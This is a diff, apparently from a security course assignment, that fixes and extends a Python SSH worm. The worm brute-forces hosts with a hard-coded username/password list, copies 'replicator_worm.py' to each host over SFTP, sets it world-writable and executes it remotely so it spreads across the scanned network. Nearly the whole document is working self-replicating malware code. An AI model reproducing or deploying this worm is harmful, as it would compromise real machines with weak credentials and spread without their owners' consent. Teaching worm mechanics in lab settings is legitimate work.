@@ -13,6 +13,7 @@ credList = [
 ('hello1', 'world'),
 ('root', '#Gig#'),
 ('cpsc', 'cpsc'),
+('mike', '123')
 ]
 
 # The file marking whether the worm should spread
@@ -23,19 +24,21 @@ INFECTED_MARKER_FILE = "/tmp/infected.txt"
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
 def isInfectedSystem():
+	#MIG: Simplified this
+	return os.path.exists(INFECTED_MARKER_FILE)
 	# Check if the system as infected. One
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
 	# as infected). 
-	try:
-		print("checking for infected.txt")
-		f=open("/tmp/infected.txt")
-		f.close()
-	except IOError:
-		print ("system not yet infected")
-		return False
-	return True
+	#try:
+	#	print("checking for infected.txt")
+	#	f=open("/tmp/infected.txt")
+	#	f.close()
+	#except IOError:
+	#	print ("system not yet infected")
+	#	return False
+	#return True
 
 #################################################################
 # Marks the system as infected
@@ -75,8 +78,12 @@ def spreadAndExecute(sshClient):
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
-	sftpClient.put("replicator_worm.py","/tmp/"+"replicator_worm.py")
-	sshClient.exec_command("python /tmp/replicator_worm.py")
+	#MIG1: Changed the first argument to /tmp/replicator_worm.py. This is because
+	# by default the working directory on the remote system will be /home/cpsc
+	sftpClient.put("/tmp/replicator_worm.py","/tmp/"+"replicator_worm.py")
+	#MIG: change the permissions of the worm to be readable and writable by anybody
+	sftpClient.chmod("/tmp/replicator_worm.py", 777)
+	sshClient.exec_command("python /tmp/replicator_worm.py 2> /tmp/log.txt")
 	#sshClient.exec_command("python /tmp/log.txt")
 	
 
@@ -94,7 +101,7 @@ def spreadAndExecute(sshClient):
 # return - 0 = success, 1 = probably wrong credentials, and
 # 3 = probably the server is down or is not running SSH
 ###########################################################
-def tryCredentials(inHost, userName, password, sshClient):
+def tryCredentials(inHost, userName, userPassword, sshClient):
 	
 	# Tries to connect to host host using
 	# the username stored in variable userName
@@ -116,12 +123,15 @@ def tryCredentials(inHost, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
+		
+	#MIG: Changed all instances of password to userPassword to prevent
+	# confusion with the "password" parameter of connect()
 	
-	print "Username: ", userName, "Password: ", password
+	print "Username: ", userName, "Password: ", userPassword
 	
 	try:
-		sshClient.connect(inHost, username = userName, password = password)
-		print("Got him!", inHost,userName, password)
+		sshClient.connect(inHost, username = userName, password = userPassword)
+		print("Got him!", inHost,userName, userPassword)		
 
 	# MIG: Removed this
 	#return 1 if wrong credentials
@@ -195,9 +205,10 @@ def getMyIP(interface):
 	
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
-	ipAddr = None
+	#MIG: Fixed this; you need to first specify a list of interfaces
+	interfaceList = netifaces.interfaces()
 	
-	for netFace in interface:
+	for netFace in interfaceList:
 		#Ip address of the interface
 		addr = netifaces.ifaddresses(netFace)[2][0]['addr']
 
@@ -288,7 +299,7 @@ print "Found hosts: To attack", HostToAttck
 
 # Go through the network hosts
 for host in HostToAttck:
-	systemIP = unicode(getMyIP(interface),"utf-8")
+	systemIP = getMyIP(interface)
 	
 	# Try to attack this host
 	sshInfo =  attackSystem(host,systemIP)
@@ -348,6 +359,10 @@ for host in HostToAttck:
 		except:
 			print("We are going to spread ")
 			temp1=spreadAndExecute(sshInfo[0])
+			
+			# MIG: If we just infected the system, we should
+			# exit.
+			exit(1)
 	if temp1==1:
-		exit()
+		exit(1)
 
